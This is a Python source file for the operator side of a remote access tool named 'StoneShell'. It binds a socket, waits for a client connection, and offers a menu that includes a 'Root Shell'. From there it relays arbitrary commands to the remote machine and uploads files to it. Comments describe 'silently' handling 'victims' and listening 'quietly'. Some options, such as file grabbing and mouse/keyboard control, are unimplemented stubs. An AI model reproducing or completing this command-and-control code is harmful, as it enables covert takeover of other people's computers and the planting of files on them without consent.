#Written and designed by Stone Preheim
import socket
import os
import sys
import tqdm
import math
import shlex

ADDR = '192.168.1.77'#portforwarding FTW! if you are looking to test this dr. use loopback
PORT = 7771
BYTEBUFFER = 8096
SPLITTER = "<<<Split>>>"#need this to still allow spaces

class Server:
    def __init__(self, addr, port):
        self.ADDRESS = addr
        self.PORT = port

    #dont have to worry about blocking sockets and multiple clients as discord controller will silently handle victims.
    def startServer(self):
        print("WELCOME TO STONESHELL")
        print(f"Starting Server on {ADDR} port {PORT}...")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:
            soc.bind((ADDR, PORT))
            soc.listen()
            print("server is listening.... quietly...")
            conn, address = soc.accept()
            with conn:
                #starting main shell loop. only shell commands right now will come to add more advanced preset scripts and such.
                print("Connected to Client. Initiating Main Menu....")
                while True:
                    Choice = input("Select number from the Following Options:\n1) Root Shell\n2) Open Peripherals\n3) Control M&K\n4) Exit\n> ")
                    #basic shell loop
                    if Choice == "1":
                        while True:
                            servCom = input("StoneShell> ")
                            if servCom == "":
                                continue
                            servComArr= shlex.split(servCom, posix=False)#shlex reads command in shell like regex, found some escape char errors
                            print(servComArr)
                            if servCom == "exit":
                                break
                            #takes form of "grab <local save location> <target location on remote>" use quotes to preserve literal path
                            elif servComArr[0] == "grab":
                                print()
                            #takes form of "upload <local file location> <target location on remote>" use quotes to preserve literal path
                            elif servComArr[0] == "upload":
                                try:
                                    servComArr[1] = servComArr[1].replace("\\\\", "\\").replace('"', '')#shlex was adding characters in an annoying way
                                    servComArr[2] = servComArr[2].replace("\\\\", "\\").replace('"', '')
                                    fileSizeBytes = os.path.getsize(servComArr[1])
                                    fileChunks = math.ceil(fileSizeBytes/BYTEBUFFER)
                                    with open(servComArr[1], "rb") as file:
                                        conn.sendall(f'upload "{servComArr[2]}" {fileSizeBytes} {fileChunks}'.encode())#sending file information for client to monitor bytes being sent. quotes will preserve the literal path once shlexed by client.
                                        progress = tqdm.tqdm(range(fileSizeBytes), "Sending File", unit="B",
                                                             unit_scale=True, unit_divisor=1024, miniters=1, smoothing=1, position=0, leave=True)#seeing some render issues with tqdm may end up removing
                                        for x in range(fileChunks-1):
                                            chunk = file.read(BYTEBUFFER)
                                            if not chunk:
                                                break
                                            conn.sendall(chunk)
                                            progress.update(len(chunk))
                                        remainingBytes = fileSizeBytes - (BYTEBUFFER * (fileChunks - 1))
                                        conn.sendall(file.read(remainingBytes))
                                        progress.update(remainingBytes)
                                        print(conn.recv(BYTEBUFFER).decode())
                                except FileNotFoundError as e:
                                    print("File was not located please check path and try again")
                                    continue
                                except Exception as e:
                                    print(e.with_traceback())
                            else:
                                conn.sendall(servCom.encode())
                                output = conn.recv(BYTEBUFFER)
                                if output == b'EXCEPTION':
                                    print("Client Experienced a fatal exception closing connection...")
                                    exit(1)
                                else:
                                    print(output.decode("utf-8"))
                    #exit other functions coming soon
                    elif Choice == "4":
                        break
                    else:
                        print("Your input was invalid or option is not yet defined")

    def testSocket(ADDR, PORT):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:  #creating socket with ipv4 and tcp. Need to reconfigure this to not use blocking.
            soc.bind((ADDR, PORT))
            soc.listen()
            print("server is listening.... quietly...")
            conn, address = soc.accept()
            with conn:
                print("Connected to:", address)
                while True:
                    data = conn.recv(BYTEBUFFER)
                    if not data:
                        break
                    print("Client sent:" + repr(data))
                    conn.sendall(data)

    #need to format command for sending in packets in order to allow spaces in directories.
    @staticmethod
    def formatCommand(commandArr, split):
        command = ""
        for i in range(len(commandArr)):
            command += commandArr[i]
            if i < len(commandArr)-1:
                command += split
        return command

if __name__ == '__main__':
    #Server.testSocket(ADDR, PORT)
    assert(Server.formatCommand(["this", "works"], SPLITTER) == f"this{SPLITTER}works"), "Commmand formatting is broken"
    serv = Server(ADDR, PORT)
    serv.startServer()
